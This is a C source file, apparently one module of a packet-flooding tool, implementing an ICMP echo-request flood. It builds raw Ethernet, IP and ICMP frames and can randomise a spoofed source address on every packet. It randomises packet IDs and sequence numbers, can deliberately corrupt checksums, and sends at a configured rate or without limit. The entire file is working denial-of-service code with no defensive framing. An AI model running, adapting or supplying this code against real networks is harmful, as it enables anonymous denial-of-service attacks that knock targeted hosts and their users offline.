#include "../../include/methods.h"

static struct icmp		*icmp;
static struct iphdr		*ip;
static u_char			frame[65535];

static void inline for_iteration(method_args_t *a)
{
	if (a->o->OPT_SOURCE[0]=='\a')
		ip->saddr=random_ipv4();
	icmp->icmp_seq=htons(random_u16());
	icmp->icmp_id=htons(random_u16());
	ip->id=htons(random_u16());

	icmp->icmp_cksum=0;
	icmp->icmp_cksum=in_check((u_short*)icmp,sizeof(*icmp));

	if (a->o->OPT_BADSUM==ARANDVAL) {
		if (randnum(0,1)==0)
			--icmp->icmp_cksum;
	}
	else if (a->o->OPT_BADSUM==1)
		--icmp->icmp_cksum;

	ip->check=0;
	ip->check=in_check((u_short*)ip,sizeof(*ip));
}

void icmp_echo_flood(method_args_t *a)
{
	memset(frame,0,sizeof(frame));
	memcpy(frame,a->machdr,14);
	ip=(struct iphdr*)(frame+14);
	icmp=(struct icmp*)((frame+14)+(sizeof(struct iphdr)));

	ip->ihl=5;
	ip->version=4;
	ip->tos=0;
	ip->ttl=100;
	ip->frag_off=0;
	ip->protocol=IPPROTO_ICMP;
	ip->saddr=a->source;
	ip->daddr=a->target;
	ip->tot_len=htons((sizeof(struct iphdr)+1+1+2+2+2));
	icmp->icmp_type=8;
	icmp->icmp_code=0;

	FLOODRUN(a,for_iteration(a),ethsend(a->fd,frame,ntohs(ip->tot_len)+14),
		a->o->OPT_PPS,a->o->OPT_TIME,a->o->OPT_UNLIMIT);
}
